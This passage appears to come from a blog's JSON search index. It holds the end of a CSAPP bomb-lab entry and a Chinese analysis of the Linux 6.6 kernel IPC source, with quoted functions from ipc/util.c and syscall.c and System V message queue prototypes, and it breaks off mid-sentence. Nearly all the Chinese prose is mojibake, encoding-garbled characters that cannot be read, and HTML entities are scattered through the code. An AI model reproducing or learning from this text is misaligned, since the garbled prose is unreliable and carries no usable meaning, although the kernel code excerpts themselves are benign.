æ³¨æ„ï¼šå½©è›‹è¦åœ¨è¾“å…¥6ä¸ªå…³å¡çš„ç­”æ¡ˆåæ‰ä¼šå‡ºç°ã€‚\n","date":"2024-09-29T00:00:00Z","image":"https://chenyuan1125.github.io/p/csappbomb%E5%AE%9E%E9%AA%8C/1_hu16866174452783611002.jpg","permalink":"https://chenyuan1125.github.io/p/csappbomb%E5%AE%9E%E9%AA%8C/","title":"CSAPP:bombå®éªŒ"},{"content":"è¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼‰æºç åˆ†æ æœ¬è°ƒç ”æŠ¥å‘Šä¸»è¦åˆ†æ6.6å†…æ ¸ç‰ˆæœ¬çš„IPCæºç éƒ¨åˆ†ã€‚\n**è¿›ç¨‹é—´é€šä¿¡ï¼ˆIPCï¼ŒInterProcess Communicationï¼‰**æ˜¯æŒ‡åœ¨ä¸åŒè¿›ç¨‹ä¹‹é—´ä¼ æ’­æˆ–äº¤æ¢ä¿¡æ¯ã€‚IPCçš„æ–¹å¼é€šå¸¸æœ‰ç®¡é“ï¼ˆåŒ…æ‹¬æ— åç®¡é“å’Œå‘½åç®¡é“ï¼‰ã€æ¶ˆæ¯é˜Ÿåˆ—ã€ä¿¡å·é‡ã€å…±äº«å­˜å‚¨ã€Socketã€Streamsç­‰ã€‚å…¶ä¸­ Socketå’ŒStreamsæ”¯æŒä¸åŒä¸»æœºä¸Šçš„ä¸¤ä¸ªè¿›ç¨‹IPCã€‚\nç®¡é“pipeï¼šç®¡é“æ˜¯ä¸€ç§åŠåŒå·¥çš„é€šä¿¡æ–¹å¼ï¼Œæ•°æ®åªèƒ½å•å‘æµåŠ¨ï¼Œè€Œä¸”åªèƒ½åœ¨å…·æœ‰äº²ç¼˜å…³ç³»çš„è¿›ç¨‹é—´ä½¿ç”¨ã€‚è¿›ç¨‹çš„äº²ç¼˜å…³ç³»é€šå¸¸æ˜¯æŒ‡çˆ¶å­è¿›ç¨‹å…³ç³»ã€‚ æ¶ˆæ¯é˜Ÿåˆ—MessageQueueï¼šæ¶ˆæ¯é˜Ÿåˆ—æ˜¯ç”±æ¶ˆæ¯çš„é“¾è¡¨ï¼Œå­˜æ”¾åœ¨å†…æ ¸ä¸­å¹¶ç”±æ¶ˆæ¯é˜Ÿåˆ—æ ‡è¯†ç¬¦æ ‡è¯†ã€‚æ¶ˆæ¯é˜Ÿåˆ—å…‹æœäº†ä¿¡å·ä¼ é€’ä¿¡æ¯å°‘ã€ç®¡é“åªèƒ½æ‰¿è½½æ— æ ¼å¼å­—èŠ‚æµä»¥åŠç¼“å†²åŒºå¤§å°å—é™ç­‰ç¼ºç‚¹ã€‚ å…±äº«å†…å­˜SharedMemoryï¼šå…±äº«å†…å­˜å°±æ˜¯æ˜ å°„ä¸€æ®µèƒ½è¢«å…¶ä»–è¿›ç¨‹æ‰€è®¿é—®çš„å†…å­˜ï¼Œè¿™æ®µå…±äº«å†…å­˜ç”±ä¸€ä¸ªè¿›ç¨‹åˆ›å»ºï¼Œä½†å¤šä¸ªè¿›ç¨‹éƒ½å¯ä»¥è®¿é—®ã€‚å…±äº«å†…å­˜æ˜¯æœ€å¿«çš„ IPC æ–¹å¼ï¼Œå®ƒæ˜¯é’ˆå¯¹å…¶ä»–è¿›ç¨‹é—´é€šä¿¡æ–¹å¼è¿è¡Œæ•ˆç‡ä½è€Œä¸“é—¨è®¾è®¡çš„ã€‚å®ƒå¾€å¾€ä¸å…¶ä»–é€šä¿¡æœºåˆ¶ï¼Œå¦‚ä¿¡å·é‡ï¼Œé…åˆä½¿ç”¨ï¼Œæ¥å®ç°è¿›ç¨‹é—´çš„åŒæ­¥å’Œé€šä¿¡ã€‚ ä¿¡å· ( signal ) ï¼š ä¿¡å·æ˜¯ä¸€ç§æ¯”è¾ƒå¤æ‚çš„é€šä¿¡æ–¹å¼ï¼Œç”¨äºé€šçŸ¥æ¥æ”¶è¿›ç¨‹æŸä¸ªäº‹ä»¶å·²ç»å‘ç”Ÿã€‚ ä¿¡å·é‡Semaphoreï¼šä¿¡å·é‡æ˜¯ä¸€ä¸ªè®¡æ•°å™¨ï¼Œå¯ä»¥ç”¨æ¥æ§åˆ¶å¤šä¸ªè¿›ç¨‹å¯¹å…±äº«èµ„æºçš„è®¿é—®ã€‚å®ƒå¸¸ä½œä¸ºä¸€ç§é”æœºåˆ¶ï¼Œé˜²æ­¢æŸè¿›ç¨‹æ­£åœ¨è®¿é—®å…±äº«èµ„æºæ—¶ï¼Œå…¶ä»–è¿›ç¨‹ä¹Ÿè®¿é—®è¯¥èµ„æºã€‚å› æ­¤ï¼Œä¸»è¦ä½œä¸ºè¿›ç¨‹é—´ä»¥åŠåŒä¸€è¿›ç¨‹å†…ä¸åŒçº¿ç¨‹ä¹‹é—´çš„åŒæ­¥æ‰‹æ®µã€‚ å¥—æ¥å­—Socketï¼šå¥—æ¥å­—ä¹Ÿæ˜¯ä¸€ç§è¿›ç¨‹é—´é€šä¿¡æœºåˆ¶ï¼Œä¸å…¶ä»–é€šä¿¡æœºåˆ¶ä¸åŒçš„æ˜¯ï¼Œå®ƒå¯ç”¨äºä¸åŒåŠå…¶é—´çš„è¿›ç¨‹é€šä¿¡ IPCï¼ˆInter-Process Communicationï¼Œè¿›ç¨‹é—´é€šä¿¡ï¼‰ç›¸å…³çš„ä»£ç ä¸»è¦ä½äºå†…æ ¸æºç æ ‘çš„ipcç›®å½•ä¸‹ï¼ˆä¸»è¦æ˜¯ä¿¡å·é‡ã€å…±äº«å†…å­˜ä»¥åŠæ¶ˆæ¯é˜Ÿåˆ—ï¼‰ï¼Œç®¡é“å’Œå‘½åç®¡é“çš„å®ç°ä¸»è¦åœ¨fs/pipe.cæ–‡ä»¶ä¸­ï¼Œå¥—æ¥å­—ä¸»è¦åˆ†å¸ƒåœ¨netç›®å½•ä¸‹ã€‚\nIPCç›®å½•æºç åˆ†æï¼š compat.cï¼š\nè¿™ä¸ªæ–‡ä»¶åŒ…å«äº†å…¼å®¹æ€§ä»£ç ï¼Œç¡®ä¿IPCæœºåˆ¶åœ¨ä¸åŒç‰ˆæœ¬çš„Linuxå†…æ ¸æˆ–ä¸åŒç¡¬ä»¶æ¶æ„ä¸Šæ­£å¸¸å·¥ä½œã€‚ ipc_sysctl.cï¼š\nè¿™ä¸ªæ–‡ä»¶ç®¡ç†IPCçš„ç³»ç»Ÿæ§åˆ¶ï¼ˆsysctlï¼‰æ¥å£ã€‚Sysctlå…è®¸åœ¨è¿è¡Œæ—¶è¯»å–å’Œä¿®æ”¹å†…æ ¸å‚æ•°ï¼Œè¿™ä¸ªæ–‡ä»¶å¤„ç†ä¸IPCç›¸å…³çš„å‚æ•°ã€‚ mq_sysctl.cï¼š\nç±»ä¼¼äºipc_sysctl.cï¼Œä½†ä¸“é—¨ç”¨äºæ¶ˆæ¯é˜Ÿåˆ—ï¼ˆMQï¼‰ã€‚å®ƒç®¡ç†æ¶ˆæ¯é˜Ÿåˆ—IPCæœºåˆ¶çš„sysctlæ¥å£å‚æ•°ã€‚ mqueue.cï¼š\nè¿™ä¸ªæ–‡ä»¶å®ç°äº†æ¶ˆæ¯é˜Ÿåˆ—åŠŸèƒ½ã€‚æ¶ˆæ¯é˜Ÿåˆ—ç”¨äºåœ¨è¿›ç¨‹ä¹‹é—´å‘é€å’Œæ¥æ”¶æ¶ˆæ¯ï¼Œæä¾›ä¸€ç§IPCæ–¹æ³•ã€‚ msg.cï¼š\nè¿™ä¸ªæ–‡ä»¶å¯èƒ½å¤„ç†System Væ¶ˆæ¯é˜Ÿåˆ—çš„å®ç°ï¼Œè¿™æ˜¯ç±»Unixæ“ä½œç³»ç»Ÿä¸­å¦ä¸€ç§æ¶ˆæ¯ä¼ é€’IPCæœºåˆ¶ã€‚ msgutil.cï¼š\nåŒ…å«æ¶ˆæ¯é˜Ÿåˆ—çš„å®ç”¨å‡½æ•°ã€‚è¿™äº›å‡½æ•°å¯èƒ½ååŠ©å®Œæˆæ¶ˆæ¯é˜Ÿåˆ—çš„å¸¸è§æ“ä½œï¼Œä¾‹å¦‚åˆ›å»ºã€åˆ é™¤å’Œç®¡ç†æ¶ˆæ¯ç¼“å†²åŒºã€‚ namespace.cï¼š\nIPCå‘½åç©ºé—´ï¼Œç®¡ç†IPCå‘½åç©ºé—´çš„åˆ›å»ºã€é”€æ¯åŠç›¸å…³æ“ä½œã€‚\næ ¸å¿ƒå‡½æ•°ï¼š\n1ã€inc_ipc_namespaces å’Œ dec_ipc_namespaces\nè¿™ä¸¤ä¸ªå‡½æ•°ç”¨äºå¢åŠ å’Œå‡å°‘IPCå‘½åç©ºé—´çš„å¼•ç”¨è®¡æ•°ï¼Œç¡®ä¿æ­£ç¡®ç®¡ç†å‘½åç©ºé—´çš„ç”Ÿå‘½å‘¨æœŸã€‚\n2ã€create_ipc_nsåˆ›å»ºä¸€ä¸ªæ–°çš„IPCå‘½åç©ºé—´ï¼ŒåŒ…æ‹¬åˆå§‹åŒ–ç›¸å…³çš„æ•°æ®ç»“æ„å’Œèµ„æº\n3ã€copy_ipcs\nè¿™ä¸ªå‡½æ•°åœ¨åˆ›å»ºæ–°è¿›ç¨‹æ—¶å¤åˆ¶IPCå‘½åç©ºé—´ã€‚å¦‚æœCLONE_NEWIPCæ ‡å¿—è¢«è®¾ç½®ï¼Œåˆ™åˆ›å»ºæ–°çš„å‘½åç©ºé—´ï¼Œå¦åˆ™è¿”å›ç°æœ‰çš„å‘½åç©ºé—´ã€‚\n4ã€free_ipcs\nè¿™ä¸ªå‡½æ•°é‡Šæ”¾æŸä¸ªå‘½åç©ºé—´ä¸­çš„æ‰€æœ‰IPCèµ„æºã€‚\n5ã€free_ipc_ns\nè¿™ä¸ªå‡½æ•°é‡Šæ”¾IPCå‘½åç©ºé—´ï¼ŒåŒ…æ‹¬ç›¸å…³èµ„æºçš„æ¸…ç†å·¥ä½œã€‚\n6ã€put_ipc_ns\nè¿™ä¸ªå‡½æ•°ç”¨äºå‡å°‘IPCå‘½åç©ºé—´çš„å¼•ç”¨è®¡æ•°ï¼Œå¹¶åœ¨å¼•ç”¨è®¡æ•°ä¸º0æ—¶é‡Šæ”¾å‘½åç©ºé—´ã€‚\n7ã€ipcns_get, ipcns_put, ipcns_install, ipcns_owner\nè¿™äº›å‡½æ•°æ˜¯é’ˆå¯¹IPCå‘½åç©ºé—´çš„æ“ä½œæ¥å£ï¼Œæä¾›äº†è·å–ã€é‡Šæ”¾ã€å®‰è£…å’Œè·å–æ‰€æœ‰è€…ç­‰åŠŸèƒ½ã€‚\nsem.cï¼š\nè¿™ä¸ªæ–‡ä»¶å®ç°äº†ä¿¡å·é‡åŠŸèƒ½ï¼Œä¸€ç§ç”¨äºæ§åˆ¶å¤šä¸ªè¿›ç¨‹å¯¹å…±äº«èµ„æºè®¿é—®çš„åŒæ­¥æœºåˆ¶ã€‚ shm.cï¼š\nè¿™ä¸ªæ–‡ä»¶å¤„ç†å…±äº«å†…å­˜æ®µï¼Œå…è®¸å¤šä¸ªè¿›ç¨‹è®¿é—®ç›¸åŒçš„å†…å­˜ç©ºé—´è¿›è¡ŒIPCã€‚å…±äº«å†…å­˜æ˜¯æœ€å¿«çš„IPCæœºåˆ¶ä¹‹ä¸€ã€‚ syscall.cï¼š\nå®ç°äº†ä¸€ä¸ªæ—§çš„SysV IPCç³»ç»Ÿè°ƒç”¨å¤šè·¯å¤ç”¨å™¨ sys_ipcï¼Œå¹¶æä¾›äº†ä¸€ä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨ ksys_ipc æ¥å¤„ç†å„ç§IPCæ“ä½œã€‚è¿™äº›æ“ä½œåŒ…æ‹¬ä¿¡å·é‡ã€æ¶ˆæ¯é˜Ÿåˆ—å’Œå…±äº«å†…å­˜çš„åˆ›å»ºã€æ§åˆ¶å’Œæ“ä½œã€‚ä»£ç è¿˜åŒ…å«äº†å…¼å®¹æ€§å¤„ç†ï¼Œä»¥æ”¯æŒ32ä½å’Œ64ä½ç³»ç»Ÿä¹‹é—´çš„äº¤äº’ã€‚\næ ¸å¿ƒå‡½æ•°ï¼š\n1ã€ ksys_ipc å‡½æ•°\nksys_ipc æ˜¯å®é™…å¤„ç†IPCè¯·æ±‚çš„æ ¸å¿ƒå‡½æ•°ã€‚å®ƒæ ¹æ®ä¼ å…¥çš„ call å‚æ•°ç¡®å®šå…·ä½“çš„IPCæ“ä½œï¼Œå¹¶è°ƒç”¨ç›¸åº”çš„å†…æ ¸å‡½æ•°æ¥å¤„ç†å…·ä½“çš„IPCæ“ä½œã€‚\n2ã€compat_ksys_ipcå‡½æ•°\nä¸ä¸Šé¢é‚£ä¸ªå‡½æ•°ä¸€æ ·ï¼Œä¸è¿‡æ˜¯åšäº†ä¸€äº›å…¼å®¹æ€§å¤„ç†ã€‚\n3ã€è¿™ä¸ªå®å®šä¹‰äº†ä¸€ä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨ ipcï¼Œå®ƒæ¥æ”¶6ä¸ªå‚æ•°ï¼Œå¹¶å°†è¿™äº›å‚æ•°ä¼ é€’ç»™ ksys_ipc å‡½æ•°è¿›è¡Œå¤„ç†ã€‚\nSYSCALL_DEFINE6(ipc, unsigned int, call, int, first, unsigned long, second, unsigned long, third, void __user *, ptr, long, fifth) { return ksys_ipc(call, first, second, third, ptr, fifth); } util.cï¼š\nåŒ…å«åœ¨ä¸åŒIPCæœºåˆ¶ä¸­å…±äº«çš„å®ç”¨å‡½æ•°ã€‚è¿™äº›å‡½æ•°å¯èƒ½åŒ…æ‹¬å†…å­˜åˆ†é…ã€é”™è¯¯å¤„ç†æˆ–å…¶ä»–é€šç”¨ä»»åŠ¡çš„è¾…åŠ©å‡½æ•°ã€‚ç”¨äºåˆå§‹åŒ–å’Œç®¡ç† Linux ç³»ç»Ÿçš„ System V IPCï¼ˆè¿›ç¨‹é—´é€šä¿¡ï¼‰æœºåˆ¶çš„ä¸€ä¸ªæ¨¡å—ã€‚System V IPC åŒ…æ‹¬ä¿¡å·é‡ï¼ˆsemï¼‰ã€æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆmsgï¼‰å’Œå…±äº«å†…å­˜ï¼ˆshmï¼‰ã€‚ä»£ç æ¶‰åŠ IPC å¯¹è±¡çš„åˆ›å»ºã€æŸ¥æ‰¾ã€æƒé™æ£€æŸ¥ã€ä»¥åŠ ID ç®¡ç†ç­‰æ“ä½œã€‚\næ ¸å¿ƒå‡½æ•°:\n1ã€ç»“æ„ä½“å®šä¹‰\nstruct ipc_proc_iface { const char *path; const char *header; int ids; int (*show)(struct seq_file *, void *); }; ipc_proc_iface ç»“æ„ä½“å®šä¹‰äº†åœ¨ /proc æ–‡ä»¶ç³»ç»Ÿä¸­æ˜¾ç¤º IPC ä¿¡æ¯çš„æ¥å£ã€‚\n2ã€åˆå§‹åŒ–å‡½æ•°\nstatic int __init ipc_init(void) { proc_mkdir(\u0026#34;sysvipc\u0026#34;, NULL); sem_init(); msg_init(); shm_init(); return 0; } device_initcall(ipc_init); ipc_init å‡½æ•°ç”¨äºåˆå§‹åŒ– IPC å­ç³»ç»Ÿï¼Œåˆ›å»º /proc/sysvipc ç›®å½•ï¼Œå¹¶è°ƒç”¨ä¿¡å·é‡ã€æ¶ˆæ¯é˜Ÿåˆ—å’Œå…±äº«å†…å­˜çš„åˆå§‹åŒ–å‡½æ•°ã€‚\n3ã€å“ˆå¸Œè¡¨å‚æ•°\nstatic const struct rhashtable_params ipc_kht_params = { .head_offset = offsetof(struct kern_ipc_perm, khtnode), .key_offset = offsetof(struct kern_ipc_perm, key), .key_len = sizeof_field(struct kern_ipc_perm, key), .automatic_shrinking = true, }; ipc_kht_params å®šä¹‰äº† IPC å¯¹è±¡å“ˆå¸Œè¡¨çš„å‚æ•°ï¼ŒåŒ…æ‹¬å¤´éƒ¨åç§»ã€é”®åç§»å’Œé”®é•¿åº¦ã€‚\n4ã€IPC ID åˆå§‹åŒ–\nvoid ipc_init_ids(struct ipc_ids *ids) { ids-\u0026gt;in_use = 0; ids-\u0026gt;seq = 0; init_rwsem(\u0026amp;ids-\u0026gt;rwsem); rhashtable_init(\u0026amp;ids-\u0026gt;key_ht, \u0026amp;ipc_kht_params); idr_init(\u0026amp;ids-\u0026gt;ipcs_idr); ids-\u0026gt;max_idx = -1; ids-\u0026gt;last_idx = -1; #ifdef CONFIG_CHECKPOINT_RESTORE ids-\u0026gt;next_id = -1; #endif } ipc_init_ids å‡½æ•°åˆå§‹åŒ– IPC æ ‡è¯†ç¬¦é›†ï¼Œè®¾ç½®åˆå§‹å€¼å¹¶åˆå§‹åŒ–å“ˆå¸Œè¡¨å’Œ ID ç®¡ç†å™¨ã€‚\n5ã€è¿›ç¨‹æ¥å£åˆå§‹åŒ–\n#ifdef CONFIG_PROC_FS static const struct proc_ops sysvipc_proc_ops; void __init ipc_init_proc_interface(const char *path, const char *header, int ids, int (*show)(struct seq_file *, void *)) { struct proc_dir_entry *pde; struct ipc_proc_iface *iface; iface = kmalloc(sizeof(*iface), GFP_KERNEL); if (!iface) return; iface-\u0026gt;path = path; iface-\u0026gt;header = header; iface-\u0026gt;ids = ids; iface-\u0026gt;show = show; pde = proc_create_data(path, S_IRUGO, NULL, \u0026amp;sysvipc_proc_ops, iface); if (!pde) kfree(iface); } #endif ipc_init_proc_interface å‡½æ•°åˆ›å»º /proc æ–‡ä»¶ç³»ç»Ÿä¸­çš„ IPC ä¿¡æ¯æ¥å£ã€‚\n6ã€æŸ¥æ‰¾ IPC é”®\nstatic struct kern_ipc_perm *ipc_findkey(struct ipc_ids *ids, key_t key) { struct kern_ipc_perm *ipcp; ipcp = rhashtable_lookup_fast(\u0026amp;ids-\u0026gt;key_ht, \u0026amp;key, ipc_kht_params); if (!ipcp) return NULL; rcu_read_lock(); ipc_lock_object(ipcp); return ipcp; } ipc_findkey å‡½æ•°åœ¨å“ˆå¸Œè¡¨ä¸­æŸ¥æ‰¾ç»™å®šé”®çš„ IPC å¯¹è±¡ï¼Œå¹¶è¿”å›è¯¥å¯¹è±¡ã€‚\n7ã€ID åˆ†é…\nstatic inline int ipc_idr_alloc(struct ipc_ids *ids, struct kern_ipc_perm *new) { int idx, next_id = -1; #ifdef CONFIG_CHECKPOINT_RESTORE next_id = ids-\u0026gt;next_id; ids-\u0026gt;next_id = -1; #endif if (next_id \u0026lt; 0) { int max_idx; max_idx = max(ids-\u0026gt;in_use*3/2, ipc_min_cycle); max_idx = min(max_idx, ipc_mni); idx = idr_alloc_cyclic(\u0026amp;ids-\u0026gt;ipcs_idr, NULL, 0, max_idx, GFP_NOWAIT); if (idx \u0026gt;= 0) { if (idx \u0026lt;= ids-\u0026gt;last_idx) { ids-\u0026gt;seq++; if (ids-\u0026gt;seq \u0026gt;= ipcid_seq_max()) ids-\u0026gt;seq = 0; } ids-\u0026gt;last_idx = idx; new-\u0026gt;seq = ids-\u0026gt;seq; idr_replace(\u0026amp;ids-\u0026gt;ipcs_idr, new, idx); } } else { new-\u0026gt;seq = ipcid_to_seqx(next_id); idx = idr_alloc(\u0026amp;ids-\u0026gt;ipcs_idr, new, ipcid_to_idx(next_id), 0, GFP_NOWAIT); } if (idx \u0026gt;= 0) new-\u0026gt;id = (new-\u0026gt;seq \u0026lt;\u0026lt; ipcmni_seq_shift()) + idx; return idx; } ipc_idr_alloc å‡½æ•°å°†ä¸€ä¸ªæ–°çš„IPCå¯¹è±¡æ·»åŠ åˆ°IDRä¸­ï¼Œå¹¶ä¸”åˆ†é…æ–°çš„ IPC IDå’Œè®¾ç½® IPC å¯¹è±¡çš„åºåˆ—å·ã€‚\n8ã€æ·»åŠ ä¸€ä¸ªIPCå¯¹è±¡\nint ipc_addid(struct ipc_ids *ids, struct kern_ipc_perm *new, int limit) { kuid_t euid; kgid_t egid; int idx, err; refcount_set(\u0026amp;new-\u0026gt;refcount, 1); if (limit \u0026gt; ipc_mni) limit = ipc_mni; if (ids-\u0026gt;in_use \u0026gt;= limit) return -ENOSPC; idr_preload(GFP_KERNEL); spin_lock_init(\u0026amp;new-\u0026gt;lock); rcu_read_lock(); spin_lock(\u0026amp;new-\u0026gt;lock); current_euid_egid(\u0026amp;euid, \u0026amp;egid); new-\u0026gt;cuid = new-\u0026gt;uid = euid; new-\u0026gt;gid = new-\u0026gt;cgid = egid; new-\u0026gt;deleted = false; idx = ipc_idr_alloc(ids, new); idr_preload_end(); if (idx \u0026gt;= 0 \u0026amp;\u0026amp; new-\u0026gt;key != IPC_PRIVATE) { err = rhashtable_insert_fast(\u0026amp;ids-\u0026gt;key_ht, \u0026amp;new-\u0026gt;khtnode, ipc_kht_params); if (err \u0026lt; 0) { idr_remove(\u0026amp;ids-\u0026gt;ipcs_idr, idx); idx = err; } } if (idx \u0026lt; 0) { new-\u0026gt;deleted = true; spin_unlock(\u0026amp;new-\u0026gt;lock); rcu_read_unlock(); return idx; } ids-\u0026gt;in_use++; if (idx \u0026gt; ids-\u0026gt;max_idx) ids-\u0026gt;max_idx = idx; return idx; } ipc_addid å‡½æ•°å°†æ–°çš„ IPC å¯¹è±¡æ·»åŠ åˆ° IDRï¼Œå¹¶åœ¨å“ˆå¸Œè¡¨ä¸­æ’å…¥è¯¥å¯¹è±¡ã€‚\n8ã€æ–°å»º IPC å¯¹è±¡\nstatic int ipcget_new(struct ipc_namespace *ns, struct ipc_ids *ids, const struct ipc_ops *ops, struct ipc_params *params) { int err; down_write(\u0026amp;ids-\u0026gt;rwsem); err = ops-\u0026gt;getnew(ns, params); up_write(\u0026amp;ids-\u0026gt;rwsem); return err; } ipcget_new å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ IPC å¯¹è±¡ã€‚\n9ã€æ£€æŸ¥ IPC æƒé™\nstatic int ipc_check_perms(struct ipc_namespace *ns, struct kern_ipc_perm *ipcp, const struct ipc_ops *ops, struct ipc_params *params) { int err; if (ipcperms(ns, ipcp, params-\u0026gt;flg)) err = -EACCES; else { err = ops-\u0026gt;associate(ipcp, params-\u0026gt;flg); if (!err) err = ipcp-\u0026gt;id; } return err; } ipc_check_perms å‡½æ•°æ£€æŸ¥ IPC å¯¹è±¡çš„æƒé™ã€‚\n10ã€è·å–å…¬å…± IPC å¯¹è±¡\nstatic int ipcget_public(struct ipc_namespace *ns, struct ipc_ids *ids, const struct ipc_ops *ops, struct ipc_params *params) { struct kern_ipc_perm *ipcp; int flg = params-\u0026gt;flg; int err; down_write(\u0026amp;ids-\u0026gt;rwsem); ipcp = ipc_findkey(ids, params-\u0026gt;key); if (ipcp == NULL) { if (!(flg \u0026amp; IPC_CREAT)) err = -ENOENT; else err = ops-\u0026gt;getnew(ns, params); } else { if (flg \u0026amp; IPC_CREAT \u0026amp;\u0026amp; flg \u0026amp; IPC_EXCL) err = -EEXIST; else err = ipc_check_perms(ns, ipcp, ops, params); ipc_unlock_object(ipcp); } up_write(\u0026amp;ids-\u0026gt;rwsem); return err; } ipcget å‡½æ•°æ˜¯ IPC å¯¹è±¡çš„å…¥å£å‡½æ•°ï¼Œæ ¹æ®é”®å€¼å†³å®šæ˜¯è·å–ç°æœ‰å¯¹è±¡è¿˜æ˜¯åˆ›å»ºæ–°å¯¹è±¡ã€‚\n11ã€ä»å“ˆå¸Œè¡¨ä¸­ç§»é™¤ipc\nstatic void ipc_kht_remove(struct ipc_ids *ids, struct kern_ipc_perm *ipcp) { if (ipcp-\u0026gt;key != IPC_PRIVATE) WARN_ON_ONCE(rhashtable_remove_fast(\u0026amp;ids-\u0026gt;key_ht, \u0026amp;ipcp-\u0026gt;khtnode, ipc_kht_params)); } ipc_kht_removeå‡½æ•°ç”¨äºä»å“ˆå¸Œè¡¨ç§»é™¤ipc\n12ã€åˆ é™¤ipc\nvoid ipc_rmid(struct ipc_ids *ids, struct kern_ipc_perm *ipcp) { int idx = ipcid_to_idx(ipcp-\u0026gt;id); WARN_ON_ONCE(idr_remove(\u0026amp;ids-\u0026gt;ipcs_idr, idx) != ipcp); ipc_kht_remove(ids, ipcp); ids-\u0026gt;in_use--; ipcp-\u0026gt;deleted = true; if (unlikely(idx == ids-\u0026gt;max_idx)) { idx = ids-\u0026gt;max_idx-1; if (idx \u0026gt;= 0) idx = ipc_search_maxidx(ids, idx); ids-\u0026gt;max_idx = idx; } } ipc_rmidå‡½æ•°ç”¨äºç§»é™¤ipc\nå…¶ä½™å‡½æ•°æœªå…¨éƒ¨åˆ—å‡º\nutil.hï¼š\nä¸util.cç›¸å…³çš„å¤´æ–‡ä»¶ã€‚å®ƒå£°æ˜äº†util.cä¸­å®šä¹‰çš„å‡½æ•°å’Œå˜é‡ï¼Œä½¿å®ƒä»¬å¯¹IPCå­ç³»ç»Ÿçš„å…¶ä»–éƒ¨åˆ†å¯è®¿é—® Linux å†…æ ¸æä¾›äº†å¤šç§ IPC æœºåˆ¶ï¼Œå…¶ä¸­System V IPC åŒ…æ‹¬ï¼šSystem V ä¿¡å·é‡ã€System Væ¶ˆæ¯é˜Ÿåˆ—ã€System V å…±äº«å†…å­˜ã€‚è¿™ä¸‰ç§é€šä¿¡æœºåˆ¶æœ‰å¾ˆå¤šç›¸ä¼¼ä¹‹å¤„ã€‚\nåˆ›å»ºæµç¨‹å¦‚ä¸‹ï¼š\næ¶ˆæ¯é˜Ÿåˆ— æ¶ˆæ¯é˜Ÿåˆ—ï¼Œæ˜¯æ¶ˆæ¯çš„é“¾æ¥è¡¨ï¼Œå­˜æ”¾åœ¨å†…æ ¸ä¸­ã€‚ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ç”±ä¸€ä¸ªæ ‡è¯†ç¬¦ï¼ˆå³é˜Ÿåˆ—IDï¼‰æ¥æ ‡è¯†ã€‚\næ¶ˆæ¯é˜Ÿåˆ—ï¼ˆMessage Queue,ç®€ç§°MQï¼‰æ˜¯ç”±å†…æ ¸ç®¡ç†çš„æ¶ˆæ¯é“¾æ¥è¡¨ï¼Œç”±æ¶ˆæ¯é˜Ÿåˆ—æ ‡è¯†ç¬¦æ ‡è¯†ï¼Œæ ‡è¯†ç¬¦ç®€ç§°é˜Ÿåˆ—IDã€‚æ¶ˆæ¯é˜Ÿåˆ—æä¾›äº†è¿›ç¨‹ä¹‹é—´å•å‘ä¼ é€æ•°æ®çš„æ–¹æ³•ï¼Œæ¯ä¸ªæ¶ˆæ¯åŒ…å«æœ‰ä¸€ä¸ªæ­£çš„é•¿æ•´å‹ç±»å‹çš„æ•°æ®æ®µã€ä¸€ä¸ªéè´Ÿçš„é•¿åº¦ä»¥åŠå®é™…æ•°æ®å­—èŠ‚æ•°ï¼ˆå¯¹åº”äºé•¿åº¦ï¼‰ï¼Œæ¶ˆæ¯é˜Ÿåˆ—æ€»å­—èŠ‚æ•°æ˜¯æœ‰ä¸Šé™çš„ï¼Œç³»ç»Ÿä¸Šæ¶ˆæ¯é˜Ÿåˆ—æ€»æ•°ä¹Ÿæœ‰ä¸Šé™ã€‚\nMQä¼ é€’çš„æ˜¯æ¶ˆæ¯ï¼Œä¹Ÿå°±æ˜¯è¿›ç¨‹é—´éœ€è¦ä¼ é€’çš„æ•°æ®ï¼Œç³»ç»Ÿå†…æ ¸ä¸­æœ‰å¾ˆå¤šMQï¼Œè¿™äº›MQé‡‡ç”¨é“¾è¡¨å®ç°å¹¶ç”±ç³»ç»Ÿå†…æ ¸ç»´æŠ¤ï¼Œæ¯ä¸ªMQç”¨æ¶ˆæ¯é˜Ÿåˆ—æè¿°ç¬¦ï¼ˆqid)æ¥åŒºåˆ†ï¼Œæ¯ä¸ªMQ çš„pidå…·æœ‰å”¯ä¸€æ€§ã€‚\nåŸå‹ #include \u0026lt;sys/msg.h\u0026gt; // åˆ›å»ºæˆ–æ‰“å¼€æ¶ˆæ¯é˜Ÿåˆ—ï¼šæˆåŠŸè¿”å›é˜Ÿåˆ—IDï¼Œå¤±è´¥è¿”å›-1 int msgget(key_t key, int flag); // æ·»åŠ æ¶ˆæ¯ï¼šæˆåŠŸè¿”å›0ï¼Œå¤±è´¥è¿”å›-1 int msgsnd(int msqid, const void *ptr, size_t size, int flag); // è¯»å–æ¶ˆæ¯ï¼šæˆåŠŸè¿”å›æ¶ˆæ¯æ•°æ®çš„é•¿åº¦ï¼Œå¤±è´¥è¿”å›-1 int msgrcv(int msqid, void *ptr, size_t size, long type,int flag); // æ§åˆ¶æ¶ˆæ¯é˜Ÿåˆ—ï¼šæˆåŠŸè¿”å›0ï¼Œå¤±è´¥è¿”å›-1 int msgctl(int msqid, int cmd, struct msqid_ds *buf); åœ¨ä»¥ä¸‹ä¸¤ç§æƒ…å†µä¸‹ï¼Œmsggetå°†åˆ›å»ºä¸€ä¸ªæ–°çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼š\nå¦‚æœæ²¡æœ‰ä¸é”®å€¼keyç›¸å¯¹åº”çš„æ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¹¶ä¸”flagä¸­åŒ…å«äº†IPC_CREATæ ‡å¿—ä½ã€‚ keyå‚æ•°ä¸ºIPC_PRIVATEã€‚ å‡½æ•°msgrcvåœ¨è¯»å–æ¶ˆæ¯é˜Ÿåˆ—æ—¶ï¼Œtypeå‚æ•°æœ‰ä¸‹é¢å‡ ç§æƒ…å†µï¼š\ntype == 0ï¼Œè¿”å›é˜Ÿåˆ—ä¸­çš„ç¬¬ä¸€ä¸ªæ¶ˆæ¯ï¼› type \u0026gt; 0ï¼Œè¿”å›é˜Ÿåˆ—ä¸­æ¶ˆæ¯ç±»å‹ä¸º type çš„ç¬¬ä¸€ä¸ªæ¶ˆæ¯ï¼› type \u0026lt; 